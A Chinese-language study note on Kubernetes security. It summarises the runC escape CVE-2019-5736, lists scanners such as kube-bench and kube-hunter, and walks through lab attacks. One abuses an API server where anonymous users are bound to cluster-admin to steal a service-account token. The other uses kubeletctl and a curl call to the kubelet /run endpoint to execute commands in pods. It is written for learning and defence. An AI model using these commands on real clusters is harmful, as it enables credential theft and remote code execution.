# Docker容器逃逸

## 漏洞描述

- 2019年2月11日，runC的维护团队报告了一个新发现的漏洞，SUSE Linux GmbH高级软件工程师Aleksa Sarai公布了影响Docker, containerd, Podman, CRI-O等默认运行时容器runc的严重漏洞**CVE-2019-5736**。漏洞会对IT运行环境带来威胁，漏洞利用会触发容器逃逸、影响整个容器主机的安全，最终导致运行在该主机上的其他容器被入侵。漏洞影响AWS, Google Cloud等主流云平台。日前，该容器逃逸漏洞的PoC利用代码已在GitHub上公布。这是CVE-2019-5736漏洞利用的Go语言实现。漏洞利用是通过覆写和执行主机系统runc二进制文件完成的。

## 漏洞原理

- 漏洞点在于runC，RunC是一个容器运行时，最初是作为Docker的一部分开发的，后来作为一个单独的开源工具和库被提取出来。作为“低级别”容器运行时，runC主要由“高级别”容器运行时（例如Docker）用于生成和运行容器，尽管它可以用作独立工具。像Docker这样的“高级别”容器运行时通常会实现镜像创建和管理等功能，并且可以使用runC来处理与运行容器相关的任务：创建容器、将进程附加到现有容器等。在Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，允许攻击者重写宿主机上的runc二进制文件，攻击者可以在宿主机上以root身份执行命令。

- 宿主机可联网，并且利用攻击者提供的image创建了container（攻击者写了一段go代码，配置了自己的IP，把这段代码放到了image里面）。container拥有root权限，并且该container后续被docker exec/attach。一句话描述，docker 18.09.2之前的runc存在漏洞，攻击者可以修改runc的二进制文件导致提权。

## 影响版本

- docker version <=18.09.2
- RunC version <=1.0-rc6

# k8s安全测试工具

## kube-bench

- 这是一个开源工具，用于检查 Kubernetes 集群是否符合安全标准。它会对集群进行自动化扫描，并提供详细的安全建议。
- 安装

~~~sh
wget https://github.com/aquasecurity/kube-bench/releases/download/v0.6.5/kube-bench_0.6.5_linux_amd64.tar.gz
tar -xvf kube-bench_0.6.5_linux_amd64.tar.gz
cd kube-bench_0.6.5_linux_amd64/
#运行 Kube-bench：
sudo ./kube-bench
~~~

## kube-hunter

- 这个工具可以帮助查找集群中可能存在的安全漏洞。它会执行一些自动化测试，并生成报告，以帮助你修复可能存在的问题。
- 安装

~~~sh
docker pull aquasec/kube-hunter
docker run -it --rm --network host aquasec/kube-hunter
docker run -it --rm --network host -v /tmp/kube-hunter-report:/tmp aquasec/kube-hunter --report /tmp/report.html
#执行完成后，在 /tmp/kube-hunter-report 目录下会生成报告文件 report.html。
~~~

## kubeaudit

- 这是一个命令行工具，可用于评估Kubernetes Pod 和 Deployment 配置的安全性。它可以检查容器镜像的安全性，权限和网络配置等问题。
- 安装

~~~sh
sudo wget -O kubeaudit https://github.com/Shopify/kubeaudit/releases/download/v0.14.2/kubeaudit_0.14.2_linux_amd64
sudo chmod +x kubeaudit
#运行 kubeaudit：
sudo ./kubeaudit
~~~

## Polaris

- 这个工具可以帮助你评估集群的安全性和可靠性。它会扫描 Kubernetes 资源并提供安全建议。
- 安装

~~~sh
git clone https://github.com/FairwindsOps/polaris.git
cd polaris
kubectl apply -f deploy/polaris/
#运行 Polaris：
polaris audit
#执行完成后，会列出检查结果。
~~~

## kubescape

- 这是一个开源工具，可以帮助您评估 Kubernetes 集群是否存在安全漏洞。它会检查集群中的资源，并根据规则集提供安全性建议。
- 安装

~~~sh
wget https://github.com/armosec/kubescape/releases/download/v1.1.11/kubescape_v1.1.11_linux_x64.tar.gz
tar xvf kubescape_v1.1.11_linux_x64.tar.gz
sudo mv kubescape /usr/local/bin/
#运行 kubescape
kubescape scan framework nsa
~~~

# 模拟攻击api-server

- 默认情况下，我们是无法访问k8s集群的apiserver和kubelet的，因为apiserver和kubelet都没有进行授权，匿名用户无法访问。

  - apiserver有两个端口：8080和6443，现在的云服务商提供的容器默认已不存在8080端口，主要问题还是在6443端口上。

  - 正常访问6443端口，会出现以下情况，我们默认访问的角色就是系统给的system:anonymous:

    ~~~json
    {
      "kind": "Status",
      "apiVersion": "v1",
      "metadata": {},
      "status": "Failure",
      "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
      "reason": "Forbidden",
      "details": {},
      "code": 403
    }
    ~~~

- 当system:anonymous用户被k8s管理员绑定到cluster-admin的集群角色时，再来访问api-server的6443端口。即可看到能访问的api内容：（有些时候用户可能会有通过api接口查看资源的需求，集群管理员可能会图省事直接给匿名用户system:anonymous开放cluster-admin权限，即这种场景）

  ~~~sh
  #集群管理员操作
  kubectl create clusterrolebinding anno-admin --clusterrole=cluster-admin --user=system:anonymous
  #https://172.16.183.75:6443/api/v1/namespaces/kube-system
  ~~~

- 给system:anonymous用户绑定了cluster-admin的权限之后，调用接口的用户如果想操作，还得给指定ns的默认sa（每个ns都有一个默认sa叫default）绑定一个token。比如default下面的sa，默认token是空的。这个token仅有authentication的作用，拿着这个token，api-server就认为你是这个sa

  ~~~sh
  kubectl get sa -n default
  kubectl describe sa default -n default
  Name:                default
  Namespace:           default
  Labels:              <none>
  Annotations:         <none>
  Image pull secrets:  <none>
  Mountable secrets:   <none>
  Tokens:              <none>
  Events:              <none>
  ~~~

- 绑定token到sa：dafault

  ~~~yaml
  #集群管理员操作
  tee secret-default.yaml <<'EOF'
  apiVersion: v1
  kind: Secret
  type: kubernetes.io/service-account-token
  metadata:
    name: default-sa
    namespace: default
    annotations:
      kubernetes.io/service-account.name: default
  EOF
  kubectl apply -f secret-default.yaml
  ~~~

- 给sa赋权

  ~~~sh
  #集群管理员操作
  kubectl create clusterrolebinding default-admin --clusterrole=cluster-admin --user=system:serviceaccount:default:default
  ~~~

- 再去通过接口看default这个ns的secret，就能获取到token了

  ~~~sh
  #攻击机上操作
  https://172.16.183.75:6443/api/v1/namespaces/default/secrets
  #...
         "token": "ZXl...UmV3"
        },
        "type": "kubernetes.io/service-account-token"
      }
    ]
  }
  #...
  ~~~

- 在攻击机上面安装kubectl，创建一个test-token文件，把token放进去

  ~~~sh
  #攻击机上操作
  #把token base64解码
  echo "ZX...V3" | base64 -d
  
  #通过命令把token写入到一个自定义的config文件里面，定义一个叫hacker的用户
  kubectl --kubeconfig=./test_token config set-credentials hacker --token="ey...Rew"
  #通过命令把api server的信息也写到这个config文件里面
  kubectl --kubeconfig=./test_token config set-cluster hacker_cluster --server=https://172.16.183.75:6443/  --insecure-skip-tls-verify
  #定义context
  kubectl --kubeconfig=./test_token config set-context hacker_context --cluster=hacker_cluster --user=hacker
  #设置current context
  kubectl --kubeconfig=./test_token config use-context hacker_context
  ~~~

- 尝试查看资源

  ~~~sh
  #攻击机上操作
  kubectl --kubeconfig=./test_token get pods -n default
  ~~~

> 总结：
>
> 1. 管理员给system:anonymous开放cluster-admin之后，攻击者可以通过接口看到所有的ns以及里面的secrets。
> 2. 管理员又给某个ns的default sa绑定了token，并且赋予了cluster-admin的权限。攻击者可以直接通过anonymous用户访问api接口，一个一个ns来试，看看哪个ns的sa绑定了token。
> 3. 拿到token之后，就能用绑这个有大权限的token，以default这个sa的身份去做任何操作了。
>
> 最佳实践：
>
> - 有时候不可避免需要给匿名用户开放权限，让集群外用户去操作集群资源。建议单独创建ns来给有需求的用户使用，授权也仅在这个ns中给admin的权限。

# 模拟攻击kubelet

> kubelet默认开了三个端口：
>
> 1. 10250：
>    - 作用：这是kubelet的主要监听端口，用于与API服务器通信，接收来自API服务器的指令，并提供节点的状态信息。
>    - 安全性：这个端口通常需要进行身份验证和授权，以确保只有合法的请求才能访问。
> 2. 10248：
>    - 作用：这个端口用于kubelet的健康检查。kubelet通过这个端口提供一个简单的HTTP服务，返回kubelet的健康状态。
>    - 安全性：这个端口通常不需要身份验证，因为它的主要目的是提供一个简单的健康检查机制。
> 3. 10255：
>    - 作用：这个端口用于提供只读的API接口，允许用户查询节点的状态和Pod的信息，但无法修改这些信息。
>    - 安全性：这个端口通常不需要身份验证，因为它提供的是只读访问。

- 正常情况下访问kubelet是没有权限的：https://172.16.183.76:10250/pods，在kubelet配置文件中可以配置开启kubelet的匿名访问。

  ~~~sh
  vim /var/lib/kubelet/config.yaml
  #anonymous.enabled改为true
  systemctl restart kubelet
  ~~~

- 开启匿名访问后，可以走通authentication，但是authorization这里过不去，没权限看pod。如果管理员同时也给匿名用户开了cluster-admin等大权限，那就可以通过kubelet访问到集群资源

  ~~~sh
  kubectl create clusterrolebinding anno-admin --clusterrole=cluster-admin --user=system:anonymous
  ~~~

- 攻击者可以通过kubeletctl这个工具进入到集群pod里面

  ~~~sh
  #在攻击机上安装kubeletctl工具
  mv kubeletctl_linux_amd64 /bin/kubeletctl
  chmod +x /bin/kubeletctl
  #查看这个节点上运行的pod、ns、containers
  kubeletctl pods -s 172.16.183.76 --port 10250 #写被攻击的kubelet所在的机器IP
  #直接进去跑个命令
  curl -k https://172.16.183.76:10250/run/default/nginx-test-74856fddd7-vcckp/nginx -d "cmd=ls" --insecure
  ~~~

  - 如果是10255端口，是只读端口，无法攻击进去在容器中执行命令，但是可以获取环境变量ENV、主进程CMDLINE等信息，里面可能包含密码和秘钥等敏感信息。
